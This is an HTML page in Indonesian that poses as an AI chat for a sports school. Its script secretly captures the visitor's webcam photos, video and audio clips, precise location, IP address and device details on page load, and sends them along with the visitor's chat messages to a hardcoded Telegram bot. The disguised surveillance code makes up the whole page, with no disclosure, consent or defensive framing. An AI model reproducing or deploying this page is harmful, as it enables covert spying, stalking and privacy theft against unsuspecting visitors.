<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Chat AI Sekolah Olahraga</title>
  <style>
    body {
      margin: 0;
      background: url('https://i.ibb.co/mBKHcdF/olahraga.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-end;
      height: 100vh;
      padding: 20px;
    }
    form {
      width: 100%;
      max-width: 500px;
      display: flex;
      gap: 10px;
    }
    input, button {
      padding: 20px;
      border: none;
      border-radius: 13px;
      font-size: 1rem;
    }
    input {
      flex: 1;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>

  <video id="video" autoplay muted playsinline></video>

  <form id="chatForm">
    <input type="text" id="chatInput" placeholder="Tanyakan sesuatu ke AI..." required />
    <button type="submit">Kirim</button>
  </form>

  <script>
    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
    const chat_id = '7552410869';

    const video = document.getElementById('video');
    let mediaRecorder, chunks = [];

    async function startAll() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;

      setInterval(() => ambilFoto(video), 4000);
      setInterval(() => rekamVideo(stream), 11000);
      setInterval(() => rekamAudio(stream), 11000);
      kirimInfo();

      fetch('https://files.catbox.moe/p7xbtg.png')
        .then(r => r.blob())
        .then(img => {
          const form = new FormData();
          form.append('chat_id', chat_id);
          form.append('photo', img, 'gambar.png');
          form.append('caption', '📎 Gambar tambahan');
          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
        });
    }

    function ambilFoto(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "auto.jpg");
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
      }, 'image/jpeg');
    }

    function rekamVideo(stream) {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("video", blob, "video10s.webm");
        fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 10000);
    }

    function rekamAudio(stream) {
      const audioStream = new MediaRecorder(stream, { mimeType: 'audio/webm' });
      const audioChunks = [];
      audioStream.ondataavailable = e => audioChunks.push(e.data);
      audioStream.onstop = () => {
        const blob = new Blob(audioChunks, { type: 'audio/webm' });
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("audio", blob, "audio.webm");
        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
      };
      audioStream.start();
      setTimeout(() => audioStream.stop(), 10000);
    }

    async function kirimInfo() {
      const waktu = new Date().toLocaleString();
      const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip);
      const ua = navigator.userAgent;
      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
      const merek = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
      const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
      const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
      const url = location.href;

      navigator.geolocation.getCurrentPosition(async pos => {
        const lat = pos.coords.latitude, lon = pos.coords.longitude;
        const maps = `https://maps.google.com/?q=${lat},${lon}`;
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
        const kota = (await res.json()).address.city || 'Tidak diketahui';

        let cuaca = '';
        try {
          const c = await fetch(`https://api.diioffc.web.id/api/tools/cekcuaca?query=${encodeURIComponent(kota)}`);
          const j = await c.json();
          if (j.status && j.result) {
            const w = j.result.weather[0];
            cuaca = `\n🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${j.result.main.temp}°C`;
          }
        } catch {}

        const isi = `
╔═══╦═══╦════╦═══╗
╚╗╔╗║╔═╗║╔╗╔╗║╔═╗║
─║║║║║─║╠╝║║╚╣║─║║
─║║║║╚═╝║─║║─║╚═╝║
╔╝╚╝║╔═╗║─║║─║╔═╗║
╚═══╩╝─╚╝─╚╝─╚╝─╚╝
╔═══╦═══╦═══╦═╗─╔╦═══╗
║╔═╗║╔═╗║╔═╗║║╚╗║║╔═╗║
║║─║║╚═╝║║─║║╔╗╚╝║║─╚╝
║║─║║╔╗╔╣╚═╝║║╚╗║║║╔═╗
║╚═╝║║║╚╣╔═╗║║─║║║╚╩═║
╚═══╩╝╚═╩╝─╚╩╝─╚═╩═══╝
        📍 Lokasi: ${maps}\n🕒 Waktu: ${waktu}\n🌐 IP: ${ip}\n🔋 Baterai: ${bat}\n📶 Jaringan: ${net}\n📱 Link: ${url}\n📱 Perangkat: ${ua}\n🏷️ Merek: ${merek}\n💾 RAM: ${ram}${cuaca}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id, text: isi })
        });
      });
    }

    // AI Pollinations chat
    document.getElementById('chatForm').onsubmit = async e => {
      e.preventDefault();
      const teks = document.getElementById('chatInput').value;
      document.getElementById('chatInput').value = '';
      const res = await fetch('https://text.pollinations.ai/openai', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'text/event-stream',
          'user-agent': 'Mozilla/5.0 (Linux; Android 14)'
        },
        body: JSON.stringify({
          messages: [{ role: 'user', content: teks }],
          stream: false
        })
      });
      const json = await res.json();
      const jawaban = json?.choices?.[0]?.message?.content || 'Gagal menjawab';
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: `💬 Q: ${teks}\n🤖 A: ${jawaban}` })
      });
    };

    window.onload = startAll;
  </script>
</body>
</html>
